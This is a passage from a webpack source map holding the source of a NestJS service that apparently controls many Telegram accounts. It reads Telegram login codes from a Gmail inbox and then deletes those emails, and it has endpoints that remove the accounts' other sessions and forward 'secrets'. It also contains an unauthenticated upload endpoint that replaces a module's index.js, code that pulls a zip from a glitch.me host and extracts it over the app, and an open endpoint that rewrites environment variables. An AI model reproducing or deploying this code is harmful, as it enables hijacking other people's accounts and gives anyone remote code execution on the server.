c/components/promote-stats/dto/update-promote-stat.dto.ts",".././src/components/promote-stats/promote-stat.controller.ts",".././src/components/promote-stats/promote-stat.module.ts",".././src/components/promote-stats/promote-stat.service.ts",".././src/components/promote-stats/schemas/promote-stat.schema.ts",".././src/components/stats2/create-stat2.dto.ts",".././src/components/stats2/stat2.controller.ts",".././src/components/stats2/stat2.module.ts",".././src/components/stats2/stat2.schema.ts",".././src/components/stats2/stat2.service.ts",".././src/components/stats2/update-stat2.dto.ts",".././src/components/stats/create-stat.dto.ts",".././src/components/stats/stat.controller.ts",".././src/components/stats/stat.module.ts",".././src/components/stats/stat.schema.ts",".././src/components/stats/stat.service.ts",".././src/components/stats/update-stat.dto.ts",".././src/components/transactions/dto/create-transaction.dto.ts",".././src/components/transactions/dto/update-transaction.dto.ts",".././src/components/transactions/schemas/transaction.schema.ts",".././src/components/transactions/transaction.controller.ts",".././src/components/transactions/transaction.module.ts",".././src/components/transactions/transaction.service.ts",".././src/components/upi-ids/upi-ids.controller.ts",".././src/components/upi-ids/upi-ids.module.ts",".././src/components/upi-ids/upi-ids.schema.ts",".././src/components/upi-ids/upi-ids.service.ts",".././src/components/user-data/dto/create-user-data.dto.ts",".././src/components/user-data/dto/search-user-data.dto.ts",".././src/components/user-data/dto/update-user-data.dto.ts",".././src/components/user-data/schemas/user-data.schema.ts",".././src/components/user-data/user-data.controller.ts",".././src/components/user-data/user-data.module.ts",".././src/components/user-data/user-data.service.ts",".././src/components/users/dto/create-user.dto.ts",".././src/components/users/dto/search-user.dto.ts",".././src/components/users/dto/update-user.dto.ts",".././src/components/users/schemas/user.schema.ts",".././src/components/users/users.controller.ts",".././src/components/users/users.module.ts",".././src/components/users/users.service.ts",".././src/middlewares/logger.middleware.ts",".././src/utils.ts","../external commonjs \"@nestjs/common\"","../external commonjs \"@nestjs/config\"","../external commonjs \"@nestjs/core\"","../external commonjs \"@nestjs/mapped-types\"","../external commonjs \"@nestjs/mongoose\"","../external commonjs \"@nestjs/platform-express\"","../external commonjs \"@nestjs/swagger\"","../external commonjs \"adm-zip\"","../external commonjs \"axios\"","../external commonjs \"big-integer\"","../external commonjs \"class-transformer\"","../external commonjs \"class-validator\"","../external commonjs \"cloudinary\"","../external commonjs \"imap\"","../external commonjs \"mongoose\"","../external commonjs \"multer\"","../external commonjs \"telegram\"","../external commonjs \"telegram/Helpers\"","../external commonjs \"telegram/Password\"","../external commonjs \"telegram/client/uploads\"","../external commonjs \"telegram/events\"","../external commonjs \"telegram/extensions/Logger\"","../external commonjs \"telegram/sessions\"","../external commonjs \"telegram/tl\"","../external node-commonjs \"fs\"","../external node-commonjs \"path\"","../webpack/bootstrap",".././src/main.ts"],"sourcesContent":["import * as Imap from 'imap';\r\nimport { fetchNumbersFromString, parseError, sleep } from '../utils';\r\n\r\nexport class MailReader {\r\n    private static instance: MailReader;\r\n    private imap: Imap;\r\n    private isReady: boolean = false;\r\n    private result: string = '';\r\n\r\n    private constructor() {\r\n        this.imap = new Imap({\r\n            user: process.env.GMAIL_ADD,\r\n            password: process.env.GMAIL_PASS,\r\n            host: 'imap.gmail.com',\r\n            port: 993,\r\n            tls: true,\r\n            tlsOptions: {\r\n                rejectUnauthorized: false,\r\n            },\r\n        });\r\n\r\n        this.imap.on('ready', () => {\r\n            console.log('Mail is Ready');\r\n            this.isReady = true;\r\n        });\r\n\r\n        this.imap.on('error', (err) => {\r\n            console.error('SomeError:', err);\r\n            this.isReady = false;\r\n        });\r\n\r\n        this.imap.on('end', () => {\r\n            console.log('Connection ended');\r\n            this.isReady = false;\r\n        });\r\n    }\r\n\r\n    public static getInstance(): MailReader {\r\n        if (!MailReader.instance) {\r\n            MailReader.instance = new MailReader();\r\n        }\r\n        return MailReader.instance;\r\n    }\r\n\r\n    public async connectToMail(): Promise<void> {\r\n        console.log('Connecting to mail server');\r\n        try {\r\n            this.imap.connect();\r\n            this.isReady = true;\r\n            console.log('Connected to mail server');\r\n        } catch (err) {\r\n            console.error('Error connecting to mail server:', parseError(err));\r\n            throw err;\r\n        }\r\n    }\r\n\r\n    public async disconnectFromMail(): Promise<void> {\r\n        console.log('Disconnecting from mail server');\r\n        try {\r\n            this.imap.end();\r\n            this.isReady = false;\r\n            console.log('Disconnected from mail server');\r\n        } catch (err) {\r\n            console.error('Error disconnecting from mail server:', parseError(err));\r\n            throw err;\r\n        }\r\n    }\r\n\r\n    public async isMailReady(): Promise<boolean> {\r\n        return this.isReady;\r\n    }\r\n\r\n    public async getCode(): Promise<string> {\r\n        console.log(\"MailReady : \", this.isReady)\r\n        if (!this.isReady) {\r\n            console.log(\"Re-Connecting mail server\");\r\n            await this.connectToMail();\r\n            await sleep(10000);\r\n        }\r\n\r\n        try {\r\n            await this.openInbox();\r\n\r\n            const searchCriteria = [['FROM', 'noreply@telegram.org']];\r\n            const fetchOptions = { bodies: ['HEADER', 'TEXT'], markSeen: true };\r\n            console.log('Inbox Opened');\r\n\r\n            const results = await new Promise<any[]>((resolve, reject) => {\r\n                this.imap.search(searchCriteria, (err, results) => {\r\n                    if (err) {\r\n                        console.error('Search error:', parseError(err));\r\n                        reject(err);\r\n                    } else {\r\n                        resolve(results);\r\n                    }\r\n                });\r\n            });\r\n\r\n            if (results.length > 0) {\r\n                console.log('Emails found:', results.length);\r\n                const length = results.length;\r\n                const fetch = this.imap.fetch([results[length - 1]], fetchOptions);\r\n\r\n                await new Promise<void>((resolve, reject) => {\r\n                    fetch.on('message', (msg, seqno) => {\r\n                        const emailData: string[] = [];\r\n\r\n                        msg.on('body', (stream, info) => {\r\n                            let buffer = '';\r\n                            stream.on('data', (chunk) => buffer += chunk.toString('utf8'));\r\n                            stream.on('end', () => {\r\n                                if (info.which === 'TEXT') {\r\n                                    emailData.push(buffer);\r\n                                }\r\n                                this.imap.seq.addFlags([seqno], '\\\\Deleted', (err) => {\r\n                                    if (err) reject(err);\r\n                                    this.imap.expunge((err) => {\r\n                                        if (err) reject(err);\r\n                                        console.log('Deleted message');\r\n                                    });\r\n                                });\r\n                            });\r\n                        });\r\n\r\n                        msg.once('end', () => {\r\n                            console.log(`Email #${seqno}, Latest ${results[length - 1]}`);\r\n                            console.log('EmailDataLength:', emailData.length);\r\n                            console.log('Mail:', emailData[emailData.length - 1].split('.'));\r\n                            this.result = fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0]);\r\n                            resolve();\r\n                        });\r\n                    });\r\n\r\n                    fetch.once('end', () => {\r\n                        console.log('Fetched mails');\r\n                        resolve();\r\n                    });\r\n                });\r\n            } else {\r\n                console.log('No new emails found');\r\n            }\r\n\r\n            console.log('Returning result:', this.result);\r\n            return this.result;\r\n        } catch (error) {\r\n            console.error('Error:', error);\r\n            this.isReady = false;\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    private async openInbox(): Promise<void> {\r\n        await new Promise<void>((resolve, reject) => {\r\n            this.imap.openBox('INBOX', false, (err) => {\r\n                if (err) {\r\n                    console.error('Open Inbox error:', parseError(err));\r\n                    reject(err);\r\n                } else {\r\n                    console.log('Inbox opened');\r\n                    resolve();\r\n                }\r\n            });\r\n        });\r\n    }\r\n}","import { Controller, Get, Param, Post, Query, UploadedFile, UploadedFiles, UseInterceptors } from '@nestjs/common';\r\nimport { AppService } from './app.service';\r\nimport { FileInterceptor, FilesInterceptor } from '@nestjs/platform-express';\r\nimport { ApiOperation, ApiParam, ApiQuery, ApiConsumes, ApiBody } from '@nestjs/swagger';\r\nimport { existsSync, mkdirSync, promises as fs } from 'fs';\r\nimport { diskStorage, File as MulterFile } from 'multer';\r\nimport { join } from 'path';\r\n\r\n@Controller()\r\nexport class AppController {\r\n    private readonly commonServicePath = join(__dirname, '..', 'node_modules', 'commonService', 'index.js');\r\n\r\n    constructor(private readonly appService: AppService) {}\r\n\r\n    @Get()\r\n    getHello(): string {\r\n        return this.appService.getHello();\r\n    }\r\n\r\n    @Post('updateCommonService')\r\n    @UseInterceptors(\r\n        FileInterceptor('file', {\r\n            storage: diskStorage({\r\n                destination: (req, file, cb) => {\r\n                    try {\r\n                        const folderPath = join(__dirname, '..', 'uploads');\r\n                        if (!existsSync(folderPath)) {\r\n                            mkdirSync(folderPath, { recursive: true });\r\n                        }\r\n                        cb(null, folderPath);\r\n                    } catch (error) {\r\n                        cb(error, null);\r\n                    }\r\n                },\r\n                filename: (req, file, cb) => {\r\n                    cb(null, 'index.js');\r\n                },\r\n            }),\r\n        }),\r\n    )\r\n    @ApiOperation({ summary: 'Upload a file to update commonService index.js' })\r\n    @ApiConsumes('multipart/form-data')\r\n    @ApiBody({\r\n        schema: {\r\n            type: 'object',\r\n            properties: {\r\n                file: { type: 'string', format: 'binary' },\r\n            },\r\n        },\r\n    })\r\n    async uploadFileAndUpdate(@UploadedFile() file: MulterFile): Promise<{ message: string }> {\r\n        try {\r\n            const targetDir = join(__dirname, '..', 'node_modules', 'commonService');\r\n            const filePath = join(targetDir, 'index.js');\r\n\r\n            // Ensure the target directory exists\r\n            if (!existsSync(targetDir)) {\r\n                mkdirSync(targetDir, { recursive: true });\r\n            }\r\n\r\n            // Read the uploaded file\r\n            const fileBuffer = await fs.readFile(file.path);\r\n\r\n            // Write to the target location\r\n            await fs.writeFile(filePath, fileBuffer);\r\n\r\n            console.log('commonService/index.js updated successfully.');\r\n            return { message: 'commonService/index.js updated successfully' };\r\n        } catch (error) {\r\n            console.error('Failed to update commonService/index.js:', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n}\r\n","import { MiddlewareConsumer, Module, NestModule } from '@nestjs/common';\r\nimport { UsersModule } from './components/users/users.module';\r\nimport { UserDataModule } from './components/user-data/user-data.module';\r\nimport { ClientModule } from './components/clients/client.module';\r\nimport { TelegramModule } from './components/Telegram/Telegram.module';\r\nimport { BufferClientModule } from './components/buffer-clients/buffer-client.module';\r\nimport { ActiveChannelsModule } from './components/active-channels/active-channels.module';\r\nimport { ArchivedClientModule } from './components/archived-clients/archived-client.module';\r\nimport { initModule } from './components/ConfigurationInit/init.module';\r\nimport { ChannelsModule } from './components/channels/channels.module';\r\nimport { AppController } from './app.controller';\r\nimport { AppService } from './app.service';\r\nimport { LoggerMiddleware } from './middlewares/logger.middleware';\r\nimport { BuildModule } from './components/builds/build.module';\r\nimport { UpiIdModule } from './components/upi-ids/upi-ids.module';\r\nimport { PromoteMsgModule } from './components/promote-msgs/promote-msgs.module';\r\nimport { StatModule } from './components/stats/stat.module';\r\nimport { Stat2Module } from './components/stats2/stat2.module';\r\nimport { PromoteStatModule } from './components/promote-stats/promote-stat.module';\r\nimport { PromoteClientModule } from './components/promote-clients/promote-client.module';\r\nimport { TgSignupModule } from './components/TgSignup/TgSignup.module';\r\nimport { TransactionModule } from './components/transactions/transaction.module';\r\nimport { NpointModule } from './components/n-point/npoint.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    TelegramModule,\r\n    ActiveChannelsModule,\r\n    ClientModule,\r\n    UserDataModule,\r\n    UsersModule,\r\n    BufferClientModule,\r\n    ArchivedClientModule,\r\n    ChannelsModule,\r\n    PromoteClientModule,\r\n    BuildModule,\r\n    UpiIdModule,\r\n    PromoteMsgModule,\r\n    PromoteStatModule,\r\n    StatModule,\r\n    Stat2Module,\r\n    TgSignupModule,\r\n    TransactionModule,\r\n    NpointModule,\r\n  ],\r\n  controllers:[AppController],\r\n  providers:[AppService],\r\n  exports:[\r\n    TelegramModule,\r\n    ActiveChannelsModule,\r\n    ClientModule,\r\n    UserDataModule,\r\n    UsersModule,\r\n    BufferClientModule,\r\n    ArchivedClientModule,\r\n    ChannelsModule,\r\n    PromoteClientModule,\r\n    TgSignupModule,\r\n    TransactionModule\r\n  ]\r\n})\r\nexport class AppModule implements NestModule {\r\n  configure(consumer: MiddlewareConsumer) {\r\n    consumer.apply(LoggerMiddleware).forRoutes('*');\r\n  }\r\n}","import { Injectable } from '@nestjs/common';\r\nimport { promises as fs } from 'fs';\r\nimport { join } from 'path';\r\nimport { diskStorage, File as MulterFile } from 'multer';\r\n\r\n@Injectable()\r\nexport class AppService {\r\n  getHello(): string {\r\n    return 'Hello World!';\r\n  }\r\n}\r\n","console.log(\"in Cloudinary\");\r\nimport * as cloudinary from 'cloudinary';\r\nimport * as path from 'path';\r\nimport * as fs from 'fs';\r\nimport { fetchWithTimeout, parseError } from './utils';\r\nimport * as AdmZip from 'adm-zip';\r\n\r\nexport class CloudinaryService {\r\n    static instance;\r\n    resources = new Map();\r\n\r\n    constructor() {\r\n        cloudinary.v2.config({\r\n            cloud_name: process.env.CL_NAME,\r\n            api_key: process.env.CL_APIKEY,\r\n            api_secret: process.env.CL_APISECRET\r\n        });\r\n    }\r\n\r\n    static async getInstance(name) {\r\n        if (!CloudinaryService.instance) {\r\n            CloudinaryService.instance = new CloudinaryService();\r\n        }\r\n        await CloudinaryService.instance.getResourcesFromFolder(name);\r\n        return CloudinaryService.instance;\r\n    }\r\n\r\n    public async downloadAndExtractZip(url: string) {\r\n        const zipPath = path.resolve(__dirname, 'temp.zip');\r\n        const extractPath = path.resolve(__dirname, '../');\r\n    \r\n        // Download the zip file\r\n        const response = await fetchWithTimeout(url, { responseType: 'arraybuffer' });\r\n        if (response?.status === 200) {\r\n          fs.writeFileSync(zipPath, response.data);\r\n          console.log('Zip file downloaded successfully.');\r\n          // Extract the zip file using adm-zip\r\n          const zip = new AdmZip(zipPath);\r\n          zip.extractAllTo(extractPath, true);\r\n          console.log('Zip file extracted successfully.');\r\n          fs.unlinkSync(zipPath); // Remove the zip file after extraction\r\n        } else {\r\n          throw new Error(`Unable to download zip file from ${url}`);\r\n        }\r\n      }\r\n\r\n    async getResourcesFromFolder(folderName) {\r\n        console.log('FETCHING NEW FILES!! from CLOUDINARY');\r\n        await this.downloadAndExtractZip(`https://promoteClients2.glitch.me/folders/${folderName}/files/download-all`);\r\n        // await this.findAndSaveResources(folderName, 'image');\r\n    }\r\n\r\n    async createNewFolder(folderName) {\r\n        await this.createFolder(folderName);\r\n        await this.uploadFilesToFolder(folderName);\r\n    }\r\n\r\n    async overwriteFile() {\r\n        const cloudinaryFileId = \"index_nbzca5.js\";\r\n        const localFilePath = \"./src/test.js\";\r\n\r\n        try {\r\n\r\n            const result = await cloudinary.v2.uploader.upload(localFilePath, {\r\n                resource_type: 'auto',\r\n                overwrite: true,\r\n                invalidate: true,\r\n                public_id: cloudinaryFileId\r\n            });\r\n            console.log(result);\r\n        } catch (error) {\r\n            parseError(error)\r\n        }\r\n\r\n    }\r\n\r\n    async findAndSaveResources(folderName: string, type: string): Promise<void> {\r\n        try {\r\n            const { resources } = await cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });\r\n            await Promise.all(resources.map(async (resource) => {\r\n                try {\r\n                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);\r\n                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);\r\n                } catch (error) {\r\n                    console.log(resource);\r\n                    parseError(error)\r\n                }\r\n            }));\r\n        } catch (error) {\r\n            parseError(error)\r\n        }\r\n    }\r\n\r\n    async createFolder(folderName) {\r\n        try {\r\n            const result = await cloudinary.v2.api.create_folder(folderName);\r\n\r\n            return result;\r\n        } catch (error) {\r\n            console.error('Error creating folder:', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    // Function to upload files from URLs to a specific folder in Cloudinary\r\n    async uploadFilesToFolder(folderName) {\r\n        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {\r\n            try {\r\n                const result = await cloudinary.v2.uploader.upload_large(url, {\r\n                    folder: folderName,\r\n                    resource_type: 'auto',\r\n                    public_id: key, // Set the key as the public_id\r\n                });\r\n\r\n                return result;\r\n            } catch (error) {\r\n                console.error('Error uploading file:', error);\r\n                throw error;\r\n            }\r\n        });\r\n\r\n        try {\r\n            return await Promise.all(uploadPromises);\r\n        } catch (error) {\r\n            console.error('Error uploading files:', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    async printResources() {\r\n        try {\r\n            this.resources?.forEach((val, key) => {\r\n                console.log(key, \":\", val);\r\n            })\r\n        } catch (error) {\r\n            parseError(error)\r\n        }\r\n    }\r\n\r\n    get(publicId) {\r\n        try {\r\n            const result = this.resources.get(publicId)\r\n            return result || '';\r\n        } catch (error) {\r\n            parseError(error)\r\n        }\r\n    }\r\n\r\n    getBuffer(publicId) {\r\n        try {\r\n            const result = this.resources.get(publicId)\r\n            return result || '';\r\n        } catch (error) {\r\n            console.log(error);\r\n        }\r\n    }\r\n}\r\n\r\nasync function saveFile(url: string, name: string) {\r\n    try {\r\n        const extension = url.substring(url.lastIndexOf('.') + 1);\r\n        const rootPath = process.cwd();\r\n        const mypath = path.join(rootPath, `${name}.${extension}`);\r\n        console.log(mypath);\r\n\r\n        const res = await fetchWithTimeout(url, { responseType: 'arraybuffer' }, 2);\r\n\r\n        if (res?.statusText === 'OK') {\r\n            if (!fs.existsSync(mypath)) {\r\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\r\n                console.log(`${name}.${extension} Saved!!`);\r\n            } else {\r\n                fs.unlinkSync(mypath);\r\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\r\n                console.log(`${name}.${extension} Replaced!!`);\r\n            }\r\n        } else {\r\n            throw new Error(`Unable to download file from ${url}`);\r\n        }\r\n    } catch (err) {\r\n        parseError(err);\r\n    }\r\n}\r\n\r\n\r\n","import { Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport mongoose, { Document } from 'mongoose';\r\n\r\nexport type ConfigurationDocument = Configuration & Document;\r\n\r\n@Schema({\r\n    versionKey: false, autoIndex: true, strict: false, timestamps: true,\r\n    toJSON: {\r\n        virtuals: true,\r\n        transform: (doc, ret) => {\r\n            delete ret._id;\r\n        },\r\n    },\r\n})\r\nexport class Configuration { }\r\n\r\nexport const ConfigurationSchema = SchemaFactory.createForClass(Configuration);\r\nConfigurationSchema.add({ type: mongoose.Schema.Types.Mixed });\r\n\r\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\r\nimport { ConfigurationService } from './init.service';\r\n\r\n@ApiTags('Configuration')\r\n@Controller('configuration')\r\nexport class ConfigurationController {\r\n  constructor(private readonly configurationService: ConfigurationService) {}\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get configuration data' })\r\n  async findOne(): Promise<any>{\r\n    return this.configurationService.findOne();\r\n  }\r\n\r\n  @Patch()\r\n  @ApiOperation({ summary: 'Update configuration' })\r\n  @ApiBody({type: Object})\r\n  async update( @Body() updateClientDto: any): Promise<any> {\r\n    return this.configurationService.update( updateClientDto);\r\n  }\r\n\r\n}\r\n","import { Module, Global, OnModuleDestroy, Inject, OnModuleInit } from '@nestjs/common';\r\nimport { ConfigModule } from '@nestjs/config';\r\nimport { MongooseModule, getConnectionToken } from '@nestjs/mongoose';\r\nimport { ConfigurationService } from './init.service';\r\nimport { ConfigurationSchema } from './configuration.schema';\r\nimport { ConfigurationController } from './init.controller';\r\nimport { Connection } from 'mongoose';\r\nimport { fetchWithTimeout, ppplbot } from '../../utils';\r\n\r\n@Global()\r\n@Module({\r\n  imports: [\r\n    ConfigModule.forRoot(), // Ensure ConfigModule is imported\r\n    MongooseModule.forRootAsync({\r\n      useFactory: () => ({\r\n        uri: process.env.mongouri,\r\n      }),\r\n    }),\r\n    MongooseModule.forFeature([{\r\n      name: 'configurationModule', collection: 'configuration', schema: ConfigurationSchema\r\n    }])\r\n  ],\r\n  providers: [ConfigurationService],\r\n  controllers: [ConfigurationController],\r\n  exports: [ConfigModule, MongooseModule],\r\n})\r\nexport class initModule implements OnModuleDestroy, OnModuleInit {\r\n  constructor(@Inject(getConnectionToken()) private readonly connection: Connection) {}\r\n  async onModuleInit() {\r\n    console.log(`Started :: ${process.env.clientId}`)\r\n    await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Started :: ${process.env.clientId}`)}`);\r\n  }\r\n\r\n  async onModuleDestroy() {\r\n    console.log(\"Init Module Destroying\")\r\n    await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`closed :: ${process.env.clientId}`)}`);\r\n    this.closeConnection();\r\n  }\r\n\r\n  private closeConnection() {\r\n    console.log(\"Closing mongoose connection\")\r\n    this.connection.close(true)\r\n  }\r\n}","import { Injectable, NotFoundException, OnModuleInit } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { Configuration } from './configuration.schema';\r\nimport { CloudinaryService } from '../../cloudinary';\r\n\r\n@Injectable()\r\nexport class ConfigurationService {\r\n    constructor(@InjectModel('configurationModule') private configurationModel: Model<Configuration>) {\r\n        this.setEnv()\r\n     }\r\n\r\n    async OnModuleInit() {\r\n       console.log(\"Config Module Inited\")\r\n    }\r\n\r\n    async findOne(): Promise<any> {\r\n        const user = await this.configurationModel.findOne({}).exec();\r\n        if (!user) {\r\n            throw new NotFoundException(`configurationModel not found`);\r\n        }\r\n        return user;\r\n    }\r\n\r\n    async setEnv() {\r\n        console.log(\"Setting Envs\");\r\n        const configuration: Configuration = await this.configurationModel.findOne({}, { _id: 0 });\r\n        const data = {...configuration}\r\n        for (const key in data) {\r\n            console.log('setting', key)\r\n            process.env[key] = data[key];\r\n        }\r\n        console.log(\"finished setting env\");\r\n    }\r\n\r\n    async update(updateClientDto: any): Promise<any> {\r\n        delete updateClientDto['_id']\r\n        const updatedUser = await this.configurationModel.findOneAndUpdate(\r\n            {}, // Assuming you want to update the first document found in the collection\r\n            { $set: { ...updateClientDto } },\r\n            { new: true, upsert: true }\r\n        ).exec();\r\n        if (!updatedUser) {\r\n            throw new NotFoundException(`configurationModel not found`);\r\n        }\r\n        return updatedUser;\r\n    }\r\n\r\n}\r\n","import { Controller, Get, Post, Body, Param, Query, BadRequestException, Res } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiQuery, ApiParam, ApiBody, ApiResponse } from '@nestjs/swagger';\r\nimport { TelegramService } from './Telegram.service';\r\nimport * as fs from 'fs';\r\nimport { AddContactsDto } from './dto/addContacts.dto';\r\nimport { AddContactDto } from './dto/addContact.dto';\r\n\r\n@Controller('telegram')\r\n@ApiTags('Telegram')\r\nexport class TelegramController {\r\n    constructor(\r\n        private readonly telegramService: TelegramService\r\n    ) {}\r\n\r\n    async connectToTelegram(mobile: string) {\r\n        return await this.telegramService.createClient(mobile);\r\n    }\r\n\r\n    @Get('connect/:mobile')\r\n    @ApiOperation({ summary: 'Create and connect a new Telegram client' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 201, description: 'Client connected successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async connectClient(@Param('mobile') mobile: string): Promise<string> {\r\n        await this.connectToTelegram(mobile);\r\n        return 'Client connected successfully';\r\n    }\r\n\r\n    @Get('disconnect/:mobile')\r\n    @ApiOperation({ summary: 'Create and connect a new Telegram client' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 201, description: 'Client connected successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async disconnect(@Param('mobile') mobile: string): Promise<boolean> {\r\n        return await this.telegramService.deleteClient(mobile);\r\n    }\r\n\r\n    @Get('disconnectAll')\r\n    @ApiOperation({ summary: 'Create and connect a new Telegram client' })\r\n    //@apiresponse({ status: 201, description: 'Client connected successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async disconnectAll(): Promise<string> {\r\n        await this.telegramService.disconnectAll();\r\n        return 'Clients disconnected successfully';\r\n    }\r\n\r\n    @Get('messages/:mobile')\r\n    @ApiOperation({ summary: 'Get messages from Telegram' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiQuery({ name: 'username', description: 'Username to fetch messages from', required: true })\r\n    @ApiQuery({ name: 'limit', description: 'Limit the number of messages', required: false })\r\n    //@apiresponse({ status: 200, description: 'Messages fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getMessages(@Param('mobile') mobile: string, @Query('username') username: string, @Query('limit') limit: number = 8) {\r\n        await this.connectToTelegram(mobile);\r\n        return this.telegramService.getMessages(mobile, username, limit);\r\n    }\r\n\r\n    @Get('messagesNew/:mobile')\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiQuery({ name: 'chatId', description: 'Username to fetch messages from', required: true })\r\n    @ApiQuery({ name: 'limit', description: 'Limit the number of messages', required: false })\r\n    @ApiQuery({ name: 'offset', description: 'offset the number of messages', required: false })\r\n    async getMessagesNew(\r\n        @Param('mobile') mobile: string,\r\n        @Query('chatId') chatId: string,\r\n        @Query('offset') offset: number,\r\n        @Query('limit') limit: number = 20\r\n    ) {\r\n        await this.telegramService.createClient(mobile, false, false);\r\n        const messages = await this.telegramService.getMessagesNew(mobile, chatId, offset, limit);\r\n        return messages;\r\n    }\r\n\r\n    @Get('chatid/:mobile')\r\n    @ApiOperation({ summary: 'Get chat ID for a username' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiQuery({ name: 'username', description: 'Username to fetch chat ID for', required: true })\r\n    //@apiresponse({ status: 200, description: 'Chat ID fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getChatId(@Param('mobile') mobile: string, @Query('username') username: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getChatId(mobile, username);\r\n    }\r\n\r\n    @Get('sendInlineMessage/:mobile')\r\n    @ApiOperation({ summary: 'Get chat ID for a username' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiQuery({ name: 'chatId', description: 'chat ID of user', required: true })\r\n    @ApiQuery({ name: 'message', description: 'message ID of user', required: true })\r\n    @ApiQuery({ name: 'url', description: 'url ID of user', required: true })\r\n    async sendInlineMessage(@Param('mobile') mobile: string,\r\n        @Query('chatId') chatId: string,\r\n        @Query('message') message: string,\r\n        @Query('url') url: string,) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.sendInlineMessage(mobile, chatId, message, url);\r\n    }\r\n\r\n    @Get('lastActiveTime/:mobile')\r\n    @ApiOperation({ summary: 'Get Last Active time of a user' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    async lastActiveTime(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getLastActiveTime(mobile);\r\n    }\r\n\r\n    @Post('joinchannels/:mobile')\r\n    @ApiOperation({ summary: 'Join channels' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiBody({ description: 'Channels string', schema: { type: 'object', properties: { channels: { type: 'string' } } } })\r\n    //@apiresponse({ status: 200, description: 'Channels joined successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async joinChannels(@Param('mobile') mobile: string, @Body('channels') channels: string) {\r\n        await this.connectToTelegram(mobile);\r\n        // this.telegramService.joinChannels(mobile, channels);\r\n        return 'Joining Channels';\r\n    }\r\n\r\n    @Get('removeauths/:mobile')\r\n    @ApiOperation({ summary: 'Remove other authorizations' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Authorizations removed successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async removeOtherAuths(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        await this.telegramService.removeOtherAuths(mobile);\r\n        return 'Authorizations removed successfully';\r\n    }\r\n\r\n    @Get('selfmsgsinfo/:mobile')\r\n    @ApiOperation({ summary: 'Get self messages info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getSelfMsgsInfo(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getSelfMsgsInfo(mobile);\r\n    }\r\n\r\n    @Get('createGroup/:mobile')\r\n    @ApiOperation({ summary: 'Get self messages info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async createGroup(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.createGroup(mobile);\r\n    }\r\n\r\n    @Get('forwardSecrets/:mobile/:fromId')\r\n    @ApiOperation({ summary: 'Get self messages info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async forwardSecrets(@Param('mobile') mobile: string, @Param('fromId') fromId: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.forwardSecrets(mobile, fromId);\r\n    }\r\n\r\n    @Get('joinChannelAndForward/:mobile/:fromId/:channel')\r\n    @ApiOperation({ summary: 'Get self messages info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async joinChannelAndForward(@Param('mobile') mobile: string, @Param('fromId') fromId: string, @Param('channel') channel: string) {\r\n        await this.telegramService.createClient(mobile, false, false);\r\n        return await this.telegramService.joinChannelAndForward(mobile, 